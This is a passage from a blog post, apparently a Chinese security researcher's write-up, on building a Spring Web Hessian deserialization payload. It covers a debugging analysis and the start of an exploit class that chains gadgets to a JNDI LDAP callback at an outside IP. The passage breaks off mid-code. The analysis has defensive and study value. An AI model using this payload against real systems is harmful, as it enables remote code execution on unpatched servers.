@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="去年8月攻防演练去某单位协助应急的时候，看到某攻击队使用了某IAM身份认证系统Hessian反序列化 0day的漏洞的流量，一直想学习下Hessian相关的知识，尝试提取流量中的Payload进行武器化，但由于忙着天天当牛马就搁置了。在后面经过分析，推断是产品中使用了Spring-Web组件的Hessian相关接口导致的反序列化漏洞，然后网上并没有具体的数据包构造方式，于是在本地通过调式分析复现了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="spring web hessian反序列化payload构造">
+<meta property="og:url" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/index.html">
+<meta property="og:site_name" content="runt0">
+<meta property="og:description" content="去年8月攻防演练去某单位协助应急的时候，看到某攻击队使用了某IAM身份认证系统Hessian反序列化 0day的漏洞的流量，一直想学习下Hessian相关的知识，尝试提取流量中的Payload进行武器化，但由于忙着天天当牛马就搁置了。在后面经过分析，推断是产品中使用了Spring-Web组件的Hessian相关接口导致的反序列化漏洞，然后网上并没有具体的数据包构造方式，于是在本地通过调式分析复现了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174010303-17276043976571.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174034505-17276043976572.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174049148-17276043976583.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174111995-17276043976584.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174126419-17276043976585.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174135839-17276043976586.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174146674-17276043976587.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174156902-17276043976588.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174206231-17276043976589.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174215958-172760439765810.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174228725-172760439765811.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174241418-172760439765812.png">
+<meta property="og:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174251648-172760439765813.png">
+<meta property="article:published_time" content="2024-09-29T10:05:32.000Z">
+<meta property="article:modified_time" content="2024-10-14T08:30:36.639Z">
+<meta property="article:author" content="runt0">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/09/29/spring-web-hessian-deserialization/image-20240929174010303-17276043976571.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>spring web hessian反序列化payload构造</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/runt0">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/10/01/commons-fileupload-bypasswaf/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/09/29/misc-talk/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/29/spring-web-hessian-deserialization/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&text=spring web hessian反序列化payload构造"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&is_video=false&description=spring web hessian反序列化payload构造"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=spring web hessian反序列化payload构造&body=Check out this article: http://example.com/2024/09/29/spring-web-hessian-deserialization/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&name=spring web hessian反序列化payload构造&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/29/spring-web-hessian-deserialization/&t=spring web hessian反序列化payload构造"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.1.</span> <span class="toc-text">Hessian服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.2.</span> <span class="toc-text">Hessian客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E5%9D%9F"><span class="toc-number">3.</span> <span class="toc-text">挖坟</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        spring web hessian反序列化payload构造
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">runt0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-29T10:05:32.000Z" class="dt-published" itemprop="datePublished">29 09 2024</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>去年8月攻防演练去某单位协助应急的时候，看到某攻击队使用了某IAM身份认证系统Hessian反序列化 0day的漏洞的流量，一直想学习下Hessian相关的知识，尝试提取流量中的Payload进行武器化，但由于忙着天天当牛马就搁置了。在后面经过分析，推断是产品中使用了Spring-Web组件的Hessian相关接口导致的反序列化漏洞，然后网上并没有具体的数据包构造方式，于是在本地通过调式分析复现了这一攻击方式，可惜当时厂商连夜升级修复，早就无法复现，网络空间搜索引擎中找到部分资产也没有发现和客户环境一致的报错特征，只能当作一次虚空复现了。流量数据包长这样：<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174010303-17276043976571.png" alt="image-20240929174010303"></p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>根据数据包里的关键字明显可以判断是，PartiallyComparableAdvisorHolder利用链，于是尝试直接使用ysoserial生成payload发送，response body返回了如下错误<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174034505-17276043976572.png" alt="image-20240929174034505"></p>
+<p>Google一下发现，这是Spring框架中对于Hessian RPC的支持中相关代码的报错信息，Spring Web包中存在一些对于远程方法调用的支持，代码在org.springframework.remoting包下，其中包括了对Hessian协议相关的支持。<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174049148-17276043976583.png" alt="image-20240929174049148"></p>
+<p>所以payload报错的原因时Hessian数据包的格式有问题，这说明Spring Web的Hessian逻辑在处理数据包时，并不是直接调用的<code>com.caucho.hessian.io.HessianInput#readObject()</code>，有可能在之前存在一些处理逻辑，于是只能自己跟踪调试。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在Google的过程中，找了一个最简单的例子来搭建一个Spring Hessian RPC的Demo，具体代码如下：</p>
+<h3 id="Hessian服务端"><a href="#Hessian服务端" class="headerlink" title="Hessian服务端"></a>Hessian服务端</h3><p>首先我们搭建一个Hessian服务端，对外提供远程方法供客户端来调用，它包括如下部分：</p>
+<ul>
+<li>方法接口：作为Client和Server间的通信内容</li>
+<li>方法的具体实现：服务端是调用方法真正干活儿的人</li>
+<li>对外Web接口：任何知道接口url地址的人都可以作为Hessian客户端与服务器通信，只要发送的数据是POST数据包，以及满足Hessian协议相关的格式</li>
+</ul>
+<ol>
+<li>服务端添加业务依赖和利用链依赖</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.62<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>定义方法接口</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHelloService</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String msg)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>实现方法接口</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service(&quot;helloService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">IHelloService</span>, Serializable &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, &quot;</span>+msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>启动Spring Boot，并设置方法url</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IHelloService helloService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(name = &quot;/hessian&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> HessianServiceExporter <span class="title function_">hessianServiceExporter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 使用Spring的HessianServie做代理</span></span><br><span class="line">        <span class="type">HessianServiceExporter</span> <span class="variable">hessianServiceExporter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianServiceExporter</span>();</span><br><span class="line">        hessianServiceExporter.setService(helloService);</span><br><span class="line">        hessianServiceExporter.setServiceInterface(IHelloService.class);</span><br><span class="line">        <span class="keyword">return</span> hessianServiceExporter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Server.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hessian客户端"><a href="#Hessian客户端" class="headerlink" title="Hessian客户端"></a>Hessian客户端</h3><p>客户端通过接口规范来远程调用服务端上的指定方法，并收到结果</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://192.168.112.136:8080/hessian&quot;</span>;</span><br><span class="line">        <span class="type">HessianProxyFactory</span> <span class="variable">factory</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxyFactory</span>();</span><br><span class="line">        <span class="type">IHelloService</span> <span class="variable">service</span> <span class="operator">=</span> (IHelloService) factory.create(IHelloService.class, url);</span><br><span class="line">        System.out.println(service.sayHello(<span class="string">&quot;world!&quot;</span>));;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>wireshark中也可以看到响应的流量</p>
+<p><img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174111995-17276043976584.png" alt="image-20240929174111995"></p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>我们的目的是弄清楚服务端反序列化的过程，并尝试构造可用的Paylaod。根据网上的文章<a target="_blank" rel="noopener" href="https://su18.org/post/hessian/">Hessian 反序列化知一二 | 素十八</a>，我们将端点下在org.springframework.remoting.caucho.HessianExporter#doInvoke函数下，并调用Hessian Client发送正常的数据包，由此来跟踪整个服务端处理Payload的过程<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174126419-17276043976585.png" alt="image-20240929174126419">第一个字节的判断，这里的两个报错信息在客户环境复现时都遇到过，其实就是Hessian数据包开头的格式不对<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174135839-17276043976586.png" alt="image-20240929174135839">然后跟进com.caucho.hessian.server.HessianSkeleton#invoke(com.caucho.hessian.io.AbstractHessianInput, com.caucho.hessian.io.AbstractHessianOutput)相关方法<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174146674-17276043976587.png" alt="image-20240929174146674"></p>
+<p><img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174156902-17276043976588.png" alt="image-20240929174156902">很明显可以看到，存在com.caucho.hessian.io.AbstractHessianInput#readObject(java.lang.Class)，但由于这是正aa常的数据包，继续调试会发现，header返回为null，因此正常情况下是无法进入while循环并触发反序列化的。那么我就尝试需要手动构造hessian字节流，看是否能控制代码的逻辑判断让他走到readObject，为此需要调试的时候关注输入流的read函数。这里需要注意对于不确定的函数最好都点进去看下有无read操作避免遗漏，比如com.caucho.hessian.io.HessianInput#skipOptionalCall<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174206231-17276043976589.png" alt="image-20240929174206231">最后是关键的com.caucho.hessian.io.HessianInput#readHeader函数，只要让他为72就会返回非null，后面还会再读俩字节计算一个不知道是啥东西的长度，我直接将这俩字节置为0。<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174215958-172760439765810.png" alt="image-20240929174215958">进而导致_chunkLength长度为0，最后返回空字符串（””），也就达到了header不为null的目的<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174228725-172760439765811.png" alt="image-20240929174228725">最后再调用com.caucho.hessian.io.HessianOutput#writeObject，写入期待已久的恶意的序列化对象数据即可，完整的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.requests.Header;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.requests.Proxies;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.requests.RawResponse;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.requests.Requests;</span><br><span class="line"><span class="keyword">import</span> net.dongliu.commons.Hexes;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> sun.net.www.http.HttpClient;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_SpringPartiallyComparableAdvisorHolder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 首先是PartiallyComparableAdvisorHolder利用链的构造</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://139.9.190.100:34567/a&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">aif</span> <span class="operator">=</span> createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        setFieldValue(aif, <span class="string">&quot;beanFactory&quot;</span>, bf);</span><br><span 